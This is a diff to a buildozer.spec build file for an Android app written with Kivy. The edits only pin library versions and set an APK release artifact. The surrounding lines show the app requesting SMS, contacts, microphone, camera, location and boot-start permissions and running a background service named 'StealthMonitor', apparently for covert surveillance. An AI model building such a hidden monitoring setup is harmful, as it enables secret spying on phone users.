@@ -6,7 +6,7 @@ source.dir = .
 source.include_exts = py,png,jpg,kv,atlas,json,ttf,xml
 source.include_dirs = assets,res
 version = 2.1.3
-requirements = python3,kivy==2.3.0,requests,flask,opencv-python-headless,numpy,pyjnius,pycryptodomex,six,setuptools
+requirements = python3,kivy==2.3.0,requests,flask==3.0.3,opencv-python-headless==4.10.0.84,numpy==1.26.4,pyjnius,pycryptodomex,six,setuptools
 orientation = portrait
 fullscreen = 0
 android.permissions = INTERNET,WAKE_LOCK,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE,POST_NOTIFICATIONS,CAMERA,RECORD_AUDIO,READ_CONTACTS,READ_SMS,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE
@@ -15,6 +15,7 @@ android.minapi = 21
 android.ndk = 25b
 android.build_tools_version = 33.0.0
 android.archs = arm64-v8a
+android.release_artifact = apk
 android.foreground_service = True
 services = StealthMonitor:monitor.py
 android.meta_data = android.content.pm.NOT_EXTRACTABLE=true
